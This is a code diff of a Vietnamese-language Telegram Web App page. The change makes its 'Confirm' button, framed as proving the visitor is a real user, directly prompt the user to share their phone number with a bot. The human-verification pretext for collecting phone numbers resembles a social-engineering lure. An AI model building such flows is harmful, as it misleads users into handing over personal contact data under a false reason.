@@ -92,30 +92,25 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   <div class="step-text">
 Bạn cần xác nhận mình là người dùng thật , hãy
      nhấp vào nút bên dưới để bắt đầu !
-  </div>
+   </div>
   
   <!-- Nút xác nhận -->
-  <button class="step-btn" onclick="showShare()">Xác nhận</button>
-  
-  <!-- Nút share số điện thoại ẩn lúc đầu -->
-  <button class="step-btn" id="share-btn" style="display:none;" onclick="sharePhone()">📲 Chia sẻ số điện thoại</button>
+  <button class="step-btn" onclick="sharePhone()">Xác nhận</button>
 </div>
 
 <script>
 let tg = window.Telegram.WebApp;
 tg.expand();
 
-// Khi nhấn xác nhận → hiện nút share số
-function showShare(){
-  document.getElementById("share-btn").style.display = "block";
-  // Nếu muốn, có thể ẩn nút Xác nhận:
-  // event.target.style.display = "none";
-}
-
-// Gửi dữ liệu về bot khi share số
+// Khi nhấn Xác nhận → hiển thị popup share số điện thoại Telegram
 function sharePhone(){
-  tg.sendData("request_phone");
-  alert("Bấm nút share số trên Telegram để gửi số điện thoại!");
+  // Hiển thị mainButton với requestContact
+  tg.MainButton.setText("📲 Chia sẻ số điện thoại");
+  tg.MainButton.show();
+  tg.MainButton.onClick(() => {
+    tg.sendData("request_phone");  // gửi data về bot
+    tg.MainButton.hide();
+  });
 }
 </script>
 </body>
